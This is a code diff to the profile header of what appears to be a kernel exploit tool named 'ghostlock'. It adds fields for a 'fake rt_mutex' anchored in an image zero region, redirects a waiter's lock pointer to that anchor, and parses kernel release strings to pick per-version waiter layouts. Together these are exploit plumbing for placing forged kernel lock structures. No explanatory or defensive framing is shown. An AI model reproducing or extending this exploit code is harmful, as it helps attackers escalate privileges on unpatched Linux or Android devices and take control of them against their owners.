@@ -126,6 +126,11 @@ namespace ghostlock::profile {
         std::optional<uint32_t> mcast_buffer_size;
         std::optional<uint32_t> mcast_task_offset;
         std::optional<uint32_t> mcast_lock_offset;
+        /* Image-relative zero region used as the fake rt_mutex. */
+        std::optional<uint64_t> select_lock_anchor_image;
+        /* Region length and slot stride (per-build). */
+        std::optional<uint64_t> select_lock_anchor_bytes;
+        std::optional<uint64_t> select_lock_anchor_stride;
     };
 
     /* Native transport representation of one Kotlin-resolved profile. */
@@ -154,6 +159,12 @@ namespace ghostlock::profile {
     struct SelectStackLayout {
         std::optional<int32_t> waiter_shift;
         std::optional<uint8_t> compact_waiter;
+        /* When present, the waiter's `lock` word carries this anchor (image
+         * offset) instead of fake_lock, so the walk's tree lives in a region we
+         * know is zero and nobody writes. */
+        std::optional<uint64_t> lock_anchor_image;
+        std::optional<uint64_t> lock_anchor_bytes;
+        std::optional<uint64_t> lock_anchor_stride;
     };
 
     struct TcpZerocopyLayout {
@@ -221,6 +232,28 @@ namespace ghostlock::profile {
             return loaded_ && values_.uname_r ? values_.uname_r : "";
         }
 
+        /* compact_waiter spans three families; only the release string separates
+         * the 5.10 layout from 5.15+'s. Unparsable => major alone. */
+        [[nodiscard]] bool compact_waiter_has_wake_state() const noexcept {
+            if (!loaded_) return false;
+            unsigned major = 0;
+            unsigned minor = 0;
+            const char *p = release();
+            while (*p >= '0' && *p <= '9') {
+                major = major * 10U + static_cast<unsigned>(*p - '0');
+                p++;
+            }
+            if (major != 0 && *p == '.') {
+                p++;
+                while (*p >= '0' && *p <= '9') {
+                    minor = minor * 10U + static_cast<unsigned>(*p - '0');
+                    p++;
+                }
+            }
+            if (major == 0) return values_.meta.kernel_major >= 6;
+            return major > 5U || (major == 5U && minor >= 15U);
+        }
+
         [[nodiscard]] const struct execution_settings *execution() const noexcept {
             return loaded_ ? &values_.execution : nullptr;
         }
@@ -274,6 +307,10 @@ namespace ghostlock::profile {
             return loaded_ && values_.meta.safe_mode;
         }
 
+        [[nodiscard]] uint8_t kernel_major() const noexcept {
+            return loaded_ ? values_.meta.kernel_major : 0;
+        }
+
         [[nodiscard]] MulticastWaiterLayout multicast_layout() const noexcept {
             return loaded_
                        ? (MulticastWaiterLayout){
@@ -290,6 +327,9 @@ namespace ghostlock::profile {
                        ? (SelectStackLayout){
                            .waiter_shift = values_.geometry.pselect_waiter_shift,
                            .compact_waiter = values_.misc.compact_waiter,
+                           .lock_anchor_image = values_.geometry.select_lock_anchor_image,
+                           .lock_anchor_bytes = values_.geometry.select_lock_anchor_bytes,
+                           .lock_anchor_stride = values_.geometry.select_lock_anchor_stride,
                        }
                        : SelectStackLayout{};
         }
